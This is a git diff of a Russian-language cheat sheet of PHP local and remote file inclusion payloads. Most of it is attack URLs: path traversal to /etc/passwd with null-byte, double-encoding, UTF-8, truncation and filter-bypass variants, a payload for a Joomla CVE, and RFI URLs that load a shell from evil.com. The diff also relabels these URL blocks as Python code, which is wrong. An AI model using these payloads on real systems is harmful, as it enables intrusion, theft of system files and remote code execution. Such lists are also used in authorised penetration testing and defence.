@@ -11,7 +11,6 @@
     * [Обход allow_url_include](#Обход-allow_url_include) 
 * [URL](#URL)
 
-
 > Уязвимость включения файлов - это тип уязвимости безопасности в веб-приложениях, особенно распространенный в приложениях, разработанных на PHP, где можно включить файл, используя недостаточную проверку входных/выходных данных.
 >> Эта уязвимость может привести к различным вредоносным действиям, включая выполнение кода, кражу данных и изменение содержимого веб-сайта.
 
@@ -47,26 +46,26 @@ http://example.com/index.php?page=../../../etc/passwd
 
 ⚠️ В версиях PHP ниже 5.3.4 мы можем завершать null байтом (%00).
 
-```
+```python
 http://example.com/index.php?page=../../../etc/passwd%00
 ```
 
 **Пример:** Joomla! Component Web TV 1.0 - CVE-2010-1470
 
-```
+```python
 {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
 ```
 
 # Двойное кодирование
 
-```
+```python
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
 # UTF-8 кодирование
 
-```
+```python
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
@@ -75,7 +74,7 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 
 В большинстве установок PHP имя файла длиннее 4096 байт будет обрезано, поэтому любые лишние символы будут отброшены.
 
-```
+```python
 http://example.com/index.php?page=../../../etc/passwd............[ДОБАВЬ БОЛЬШЕ]
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ДОБАВЬ БОЛЬШЕ]
 http://example.com/index.php?page=../../../etc/passwd/./././././.[ДОБАВЬ БОЛЬШЕ] 
@@ -84,7 +83,7 @@ http://example.com/index.php?page=../../../[ДОБАВЬ БОЛЬШЕ]../../../.
 
 # Обход фильтров
 
-```
+```python
 http://example.com/index.php?page=....//....//etc/passwd
 http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
@@ -96,25 +95,25 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C
 
 Удаленное включение файлов больше не работает в конфигурации по умолчанию, поскольку allow_url_include отключен начиная с PHP 5.
 
-```
+```python
 allow_url_include = On
 ```
 
 * Большинство методов обхода фильтров из раздела LFI можно повторно использовать для RFI.
 
-```
+```python
 http://example.com/index.php?page=http://evil.com/shell.txt
 ```
 
 # Null Byte RFI
 
-```
+```python
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
 # Двойное кодирование RFI
 
-```
+```python
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
